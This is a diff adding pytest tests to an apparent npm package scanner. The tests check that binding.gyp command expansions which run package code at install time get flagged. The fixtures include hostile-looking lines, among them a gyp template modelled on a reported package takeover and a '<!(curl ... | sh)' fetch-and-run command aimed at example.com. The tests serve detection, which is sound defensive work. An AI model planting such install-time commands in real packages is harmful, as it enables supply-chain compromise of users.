@@ -406,6 +406,126 @@ def test_binding_gyp_turned_off_or_replaced(make_npm):
     assert _severities(built) == [("BKT-NPM-SCRIPT-001", "info"), ("BKT-SKIP-003", "info")]
 
 
+# gyp runs <!(cmd) when node-gyp reads the file. The autotel takeover
+# (2026-06) shipped this binding.gyp and nothing else that runs at install.
+_GYP_ATTACK = '{"targets": [{"target_name": "Setup", "type": "none", "sources": ["%s"]}]}'
+
+
+@pytest.mark.parametrize(
+    "expansion",
+    [
+        "<!(node index.js > /dev/null 2>&1 && echo stub.c)",  # as shipped
+        "<!@(node index.js)",
+        "<@!(node index.js)",
+        ">!(node index.js)",
+        "^!(node index.js)",
+        "<!(sh -c 'node index.js')",
+    ],
+)
+def test_gyp_command_that_runs_package_code_is_flagged(make_npm, expansion):
+    files = {"package/binding.gyp": _GYP_ATTACK % expansion, "package/index.js": "x = 1;\n"}
+    findings = scan_artifact(make_npm(files=files))
+    gyp = [f for f in findings if f.file_path == "package/binding.gyp"]
+    assert [(f.rule_id, f.severity.value) for f in gyp] == [("BKT-NPM-SCRIPT-001", "medium")]
+    assert verdict(findings) == "flagged"
+
+
+def test_gyp_command_file_is_read_as_install_code(make_npm):
+    steal = "require('https').get('https://example.com/x');\n"
+    files = {"package/binding.gyp": _GYP_ATTACK % "<!(node index.js)", "package/index.js": steal}
+    findings = scan_artifact(make_npm(files=files))
+    found = [(f.rule_id, f.file_path) for f in findings]
+    assert ("BKT-NPM-INSTALL-001", "package/index.js") in found
+
+
+def test_gyp_command_in_an_included_file_runs_in_its_folder(make_npm):
+    files = {
+        "package/binding.gyp": '{"includes": ["deps/common.gypi"]}',
+        "package/deps/common.gypi": "{'variables': {'x': '<!(node ../lib/a.js)'}}",
+        "package/lib/a.js": "x = 1;\n",
+    }
+    findings = scan_artifact(make_npm(files=files))
+    assert ("BKT-NPM-SCRIPT-001", "medium", "package/deps/common.gypi") in [
+        (f.rule_id, f.severity.value, f.file_path) for f in findings
+    ]
+
+
+def test_gyp_command_that_fetches_is_high(make_npm):
+    gyp = _GYP_ATTACK % "<!(curl -s https://example.com/x | sh)"
+    findings = scan_artifact(make_npm(files={"package/binding.gyp": gyp}))
+    assert ("BKT-NPM-INSTALL-001", "high") in _severities(findings)
+
+
+@pytest.mark.parametrize(
+    "expansion",
+    [
+        """<!@(node -p \\"require('node-addon-api').include\\")""",  # most N-API addons
+        """<!(node -e \\"require('nan')\\")""",  # nan addons
+        """<!(node -p \\"require('node-addon-api').targets\\"):node_addon_api""",
+        "<!@(pkg-config --cflags glib-2.0)",
+        "<(module_root_dir)/src",  # a variable, not a command
+    ],
+)
+def test_usual_gyp_commands_stay_unflagged(make_npm, expansion):
+    files = {"package/binding.gyp": _GYP_ATTACK % expansion}
+    findings = scan_artifact(make_npm(files=files))
+    assert [f for f in findings if f.file_path == "package/binding.gyp"] == []
+    assert verdict(findings) == "not_verified"  # the native build itself is still not read
+
+
+def test_gyp_file_strings_are_read_as_python_reads_them(make_npm):
+    # gyp files are Python literals: escapes, both quote styles, comments.
+    gyp = """# comment <!(node evil.js)
+{'targets': [{'target_name': 'a',
+  'include_dirs': ['<!(node -p "require(\\'nan\\')")', "<!(node lib/a.js)"]}]}
+"""
+    files = {"package/binding.gyp": gyp, "package/lib/a.js": "x = 1;\n", "package/evil.js": ""}
+    findings = scan_artifact(make_npm(files=files))
+    gyp_findings = [f.message for f in findings if f.file_path == "package/binding.gyp"]
+    assert gyp_findings == ["binding.gyp runs package code at install (node lib/a.js)"]
+
+
+def test_gyp_file_that_does_not_parse_is_not_read(make_npm):
+    gyp = "{'targets': [<!(node index.js)"
+    findings = scan_artifact(make_npm(files={"package/binding.gyp": gyp}))
+    assert ("BKT-SKIP-003", "package/binding.gyp") in [(f.rule_id, f.file_path) for f in findings]
+
+
+@pytest.mark.parametrize(
+    "manifest, files",
+    [
+        # node-gyp and npm ship gyp's own files; nothing builds them at install.
+        (MANIFEST, {"package/gyp/addon.gypi": "{'x': '<!(node <(dir)/a.js)'}"}),
+        # gypfile false and no install script: npm builds nothing.
+        (_with(gypfile=False), {"package/binding.gyp": _GYP_ATTACK % "<!(node index.js)"}),
+    ],
+)
+def test_gyp_files_nothing_builds_are_not_read(make_npm, manifest, files):
+    findings = scan_artifact(make_npm(manifest, files={**files, "package/index.js": "x = 1;\n"}))
+    assert verdict(findings) == "clean"
+
+
+@pytest.mark.parametrize(
+    "manifest, gyp",
+    [
+        # A build script can point node-gyp at another folder.
+        (_with(scripts={"install": "node-gyp rebuild -C sub"}), "package/sub/binding.gyp"),
+        (_with(scripts={"install": "cd sub && node-gyp rebuild"}), "package/sub/binding.gyp"),
+        # npm and node-gyp find Binding.gyp on a case-insensitive disk.
+        (MANIFEST, "package/Binding.gyp"),
+        (_with(scripts={"install": "node-gyp rebuild"}), "package/BINDING.GYP"),
+    ],
+)
+def test_binding_gyp_elsewhere_or_in_another_case_is_read(make_npm, manifest, gyp):
+    folder = "../" if "/sub/" in gyp else ""
+    files = {gyp: _GYP_ATTACK % f"<!(node {folder}index.js)", "package/index.js": "x = 1;\n"}
+    findings = scan_artifact(make_npm(manifest, files=files))
+    assert ("BKT-NPM-SCRIPT-001", "medium", gyp) in [
+        (f.rule_id, f.severity.value, f.file_path) for f in findings
+    ]
+    assert verdict(findings) == "flagged"
+
+
 def test_prepare_is_info_since_a_registry_tarball_never_runs_it(make_npm):
     findings = scan_artifact(make_npm(_with(scripts={"prepare": "curl https://example.com"})))
     assert _severities(findings) == [("BKT-NPM-SCRIPT-001", "info")]
